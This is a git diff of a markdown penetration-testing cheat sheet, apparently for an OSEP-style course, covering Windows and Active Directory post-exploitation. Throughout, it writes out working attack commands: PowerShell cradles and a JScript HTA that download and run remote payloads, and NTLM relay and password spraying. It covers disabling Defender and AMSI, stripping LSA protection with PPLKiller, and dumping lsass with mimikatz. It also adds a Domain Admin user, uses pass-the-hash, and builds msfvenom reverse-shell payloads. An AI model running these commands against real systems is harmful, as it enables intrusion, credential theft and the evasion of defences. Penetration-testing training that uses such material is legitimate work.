@@ -1302,8 +1302,7 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
 ```
 
-### Bringing it home
-
+## Bringing it home
 -  Save the below string to a file as .bat and execute.
 
 ```powershell
@@ -1311,33 +1310,71 @@ powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('h
 ```
 <br>
 
-### Download_file
+## Download_file
 ```powershell
 (New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")
 ```
 <br>
 
-### New_Session
+## Change user pw remotely
+```
 
+$remote = New-Object System.Management.Automation.PSCredential (“DOMAIN\USER”, (ConvertTo-SecureString “PASSWORD” -AsPlainText -Force)) 
+$creds = ConvertTo-SecureString 'PasswordRulon123!' -AsPlainText -Force 
+Set-DomainUserPassword -Identity USER -AccountPassword $creds -Credential $remote -Verbose 
+```
+<br>
+
+## Download files
+
+```
+powershell.exe iwr -uri http://IP/nc64.exe -o c:\windows\tasks\nc64.exe 
+powershell.exe wget http://IP/ -out C:\file
+```
+<br>
+
+## Execute cmd Remotely
+```
+Invoke-Command  -ScriptBlock {cmd /c powershell C:\Users\public\rev.ps1} -Session $sess
+```
+<br>
+
+## New_Session
 ```powershell
 $sess = New-PSSession -ComputerName <Name>
 ```
-
 <br>
 
-### Copy_to_session
-
+## Copy_to_session
 ```powershell
 Copy-Item -Path C:\Users\public\rev.ps1 -Destination 'C:\Users\public\rev.ps1' -ToSession $sess
 ```
-
 <br>
  
-### Powershell_Cradle
+## Powershell_Cradle
 ```powershell
 iex(new-object net.webclient).downloadstring('http://192.168.49.68/<ToolName>.ps1')
 ```
+
 <br>
+
+## Unquoted paths via powerup
+```
+Write-ServiceBinary -Name 'unquotedsvc' -Path 'C:\Program Files\Unquoted Path Service\Common.exe' -Username badmin1 -Password p4ssw0rd123 -Verbose
+
+net start unquotedsvc
+
+```
+<br>
+
+## Service Permissions via powerup
+```
+Invoke-ServiceAbuse -Name 'daclsvc' -Username badmin3 -Password p4ssword123
+
+net start daclsvc
+```
+<br>
+
 
 ### Constrained_lang_mode
 ```powershell
@@ -1348,6 +1385,29 @@ $ExecutionContext.SessionState.LanguageMode
 ### CLM_Bypass
 
 - [CLM-BYPASS](https://github.com/calebstewart/bypass-clm)
+
+```
+Certutil -encode osep-clm.exe enc5.txt 
+```
+<br>
+
+```
+<head> 
+<script language="JScript"> 
+var shell = new ActiveXObject("WScript.Shell"); 
+var res = shell.Run("powershell iwr -uri http://IP/enc5.txt -outfile C:\\Windows\\Tasks\\enc7.txt;powershell certutil -decode C:\\Windows\\Tasks\\enc7.txt C:\\Windows\\Tasks\\execute.exe; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\execute.exe"); 
+</script> 
+</head> 
+<body> 
+<script language="JScript"> 
+self.close(); 
+</script> 
+</body> 
+</html> 
+```
+<br>
+or
+<br>
 
 ```powershell
 Installutil.exe /logfile= /LogToConsole=false /U "c:\temp\bypass-clm.exe"
@@ -1418,8 +1478,18 @@ $method.Invoke(0, $null)
 or
 - $sess = New-PSSession -ComputerName <Name>
 - Copy-item -path C:\users\puublic\payload.ps1 -destination 'C:\users\public\payload.ps1' -tosession $sess
-- latmov.exe <server> senorservice "c:\windows\tasks\payload.exe"
 ```
+<br>
+
+```
+latmov.exe <server> senorservice "c:\windows\tasks\payload.exe"
+or
+proxychains python scshell.py -service-name Sensorservice DOMAIN/USERNAME:PASSWORD@ComputerIP
+proxychains python scshell.py -service-name Sensorservice DOMAIN/USERNAME@ComputerIP -hashes 00000000000000000000000000000000:aec2214937bedcfa722c4123ca859423
+```
+
+<br>
+
 
 ## SSH
 
@@ -1429,7 +1499,7 @@ ssh user@KillaOcean -L 127.0.0.1:5577:127.0.0.1:5577
 ```
 <br>
 
-### Remote Port Forwarding:
+## Remote Port Forwarding:
 
 ```bash
 ssh user@KillaOcean -R 127.0.0.1:5577:127.0.0.1:22
@@ -1438,7 +1508,7 @@ ssh user@KillaOcean -R 127.0.0.1:5577:127.0.0.1:22
 
 
 
-### Dynamic Port Forwarding:
+## Dynamic Port Forwarding:
 ```bash
 ssh -NfD 1080 user@KillaOcean
 proxychains4 nmap 192.168.1.0/24
@@ -1456,7 +1526,7 @@ auxiliary/server/socks_proxy
 ```
 <br>
 
-### Pivoting
+# Pivoting
 
 - [Pivoting](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)
 
@@ -1464,7 +1534,7 @@ auxiliary/server/socks_proxy
 
 ## Chisel
 
-### Port Forwarding
+## Port Forwarding
 
 #### Attacker Machine:
 ```powershell
@@ -1475,9 +1545,10 @@ chisel server -p 6666 --reverse
 ```powershell
 chisel client attackerip:6666 R:2222:127.0.0.1:3306/tcp
 ```
+
 <br>
 
-### SOCKS Proxy
+## SOCKS Proxy
 
 #### Attacker Machine:
 ```powershell
@@ -1488,6 +1559,8 @@ chisel server -p 6666 --socks5 --reverse
 ```powershell
 chisel client attackerip:6666 R:5000:socks
 ```
+
+<br>
 
 ## Bloodhound
 
@@ -1515,6 +1588,9 @@ pip install bloodhound
 bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
 ```
 
+<br>
+<br>
+
 # Active_Directory
 
 [Cheatsheet 1](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#asreproast)
@@ -1526,12 +1602,47 @@ bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local
 [Cheatsheet 4](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
 
 <br>
+
+## NTLMRELAY
+
+*Signing must be disabled 
+*Cannot execute this Against Self
+```
+cme smb — gen-relay-list smb_targets.txt 172.21.23.0/24
+Responder -rdP -I eth0
+Ntlmrelayx.py -tf targets.txt -e payload.exe
+```
+
 <br>
 
+## Password Spraying
+```
+cme smb 192.168.1.101 -u user1 user2 user3 -p Summer18
+cme smb 192.168.1.101 -u user1 -p password1 password2 password3
+```
+
+<br>
+
+## APPLOCKER ENUMERATION
+```
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections 
+```
+
+<br>
+
+## LAPS
+```
+iex(New-Object Net.WebClient).DownloadString('http://IP/PowerView.ps1') 
+Get-ADObject -Name MachineName -DomainController IP -Properties ms-mcs-admpwd 
+```
+
+<br>
 
 # Windows
 
-### RollBack
+<br>
+
+## RollBack Defender
 ```
  “C:\Program Files\Windows Defender\MpCmdRun.exe” -removedefinitions -all
  
@@ -1540,10 +1651,21 @@ REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeM
 REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableBehaviorMonitoring " /t REG_DWORD /d 1 /f
 
 ```
+
 <br>
 <br>
 
-### Disable_Restricted_Admin
+## Create and Add user to DA group
+```
+net user John Password123! /add /domain 
+net localgroup "Remote Desktop Users" John /add /domain 
+net group "domain admins" John /add /domain 
+```
+
+<br>
+<br>
+
+## Disable_Restricted_Admin
 *RDP
 
 ```
@@ -1555,7 +1677,7 @@ xfreerdp /u:admin /pth:HASH /v:<IP> /cert-ignore
 <br>
 <br>
 
-### Writeable_paths
+## Writeable_paths
 
 ```powershell
 accesschk.exe "currentuser" C:\Windows -wus
@@ -1564,8 +1686,17 @@ accesschk.exe "currentuser" C:\Windows -wus
 <br>
 <br>
 
+## Run Dlls
+```
+Rundll32 c:\users\public\payload.dll,run
+```
 
-### Alternate_Data_Stream_Execution
+<br>
+<br>
+
+
+
+## Alternate_Data_Stream_Execution
 
 ```powershell
 1. Identify file that is both writeable and executable by your user using icacls.exe
@@ -1577,7 +1708,7 @@ accesschk.exe "currentuser" C:\Windows -wus
 <br>
 <br>
 
-### Fodhelper
+## Fodhelper
 
 ```
 1. Copy the code below and edit for your payload/create powershell script
@@ -1608,8 +1739,7 @@ tryme
 <br>
 <br>
 
-### pplkiller
-
+## PPLKiller
 ```
 1. upload the driver RTCore64.sys
 2. upload PPLKiller.exe
@@ -1617,38 +1747,41 @@ tryme
 4. PPLKiller.exe /disableLSAProtection
 *This is not work on a medium mandatory level ref to fodhelper section to obtain a high level. Verify this by 'whoami /groups'
 ```
+
 <br>
 <br>
 
 # Mimikatz
 
+<br>
 
-### Metasploit Kiwi
-
+## Metasploit Kiwi
 ```
 1. While in meterpreter 'load kiwi'
 2. creds_all
 *Need system priv, Can be done using 'printspoofer.exe -i -c powershell.exe'....impersonate has to be enabled.
 ```
 
+<br>
 
-### Disable_LSA_and_Dump
-
+## Disable_LSA_and_Dump
 ```powershell
 1. +!
 2. !processprotect /process:lsass.exe /remove
 3. sekurlsa::logonpasswords
 ```
+
 <br>
 
-### Offline_Dump
+## Offline_Dump
 ```powershell
 1. sekurlsa::minidump lsass.dmp
 2. sekurlsa::logonpasswords
 ```
+
 <br>
 
-### Minidump
+## Minidump
 ```csharp
 using System;
 using System.Diagnostics;
@@ -1680,15 +1813,20 @@ IntPtr.Zero);
 
 - [Mimikatz](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)
 
+<br>
 
 
 ### Windows_Privilege_Escalation
 
 - [Windows_Privilege_Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 
+<br>
+
 ### Windows_Download_Execute
 
 - [Windows_Download_Execute](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md)
+
+<br>
 
 ### Windows_With_Creds
 
@@ -1698,10 +1836,14 @@ IntPtr.Zero);
 
 # Linux
 
-### Linux_Privilege_Escalation
+## Linux_Privilege_Escalation
+
+<br>
 
 - [Linux_Privilege_Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
 
+ <br>
+ 
 ### Full TTY
  
  ```
@@ -1719,7 +1861,7 @@ IntPtr.Zero);
 [Cheatsheet 2](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
 
 [Cheatsheet 3](https://www.puckiestyle.nl/impacket/)
-<br>
+
 <br>
 
 
@@ -1758,9 +1900,12 @@ INVPH -encsh $code.encryptedShellcode -k $code.encryptionKey -ivk $code.initVect
 $code = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' -usebasicparsing).Content
 ```
 
+<br>
+
 ```powershell
 Invoke-ImpersonateProcessHollow -processId 1092 -exe "svchost.exe" -decryptKey $code.encryptionKey -shellCode $code.encryptedShellcode -initVector $code.initVectorKey
 ```
+
 <br>
 
 - ### Disable AMSI:
@@ -1775,6 +1920,7 @@ Disable-AyEmEsEye -verbose
 ```
 Disable-DefenderForEndpoint
 ```
+
 <br>
 
 - ### Cmdlets
@@ -1849,29 +1995,60 @@ Undo-Impersonation
 sudo msfvenom -p windows/x64/meterpreter/reverse_http lhost=192.168.x.x lport=8080 EXITFUNC=thread -f csharp
 ```
 
+<br>
+
 ```
 sudo msfconsole -qx "use exploit/multi/handler ;set payload windows/meterpreter/reverse_tcp; set lhost tun0; set lport 4444;exploit;"
 ```
+
+<br>
 
 ```
 sudo msfconsole -qx "use exploit/multi/handler ;set payload linux/x86/meterpreter/reverse_tcp; set lhost tun0; set lport 4444;exploit;"
 ```
 
+<br>
+
 ```
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.x.x lport=4444 -f exe -o 4444.exe
 ```
+
+<br>
 
 ```
 msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.x.x lport=4444 -f elf -o lin-4444
 ```
 
+<br>
+
 ```
 msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -f exe -o 4444.exe
 ```
 
+<br>
+
 ```
 msfvenom -p linux/x86/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -f elf -o lin-4444
 ```
+
+<br>
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.21.23.10 LPORT=443 EXITFUNC=thread -f ps1
+```
+
+ <br>
+ 
+```
+msfvenom -p windows/x64/meterpreter/reverse_https prependmigrateprocess=explorer.exe prependmigrate-true LHOST=172.21.23.10 LPORT=443 EXITFUNC=thread -f ps1
+```
+
+<br>
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp prependmigrateprocess=explorer.exe prependmigrate-true LHOST=172.21.23.2 LPORT=443 -f csharp
+```
+
 
 ### Metasploit_Refs
 
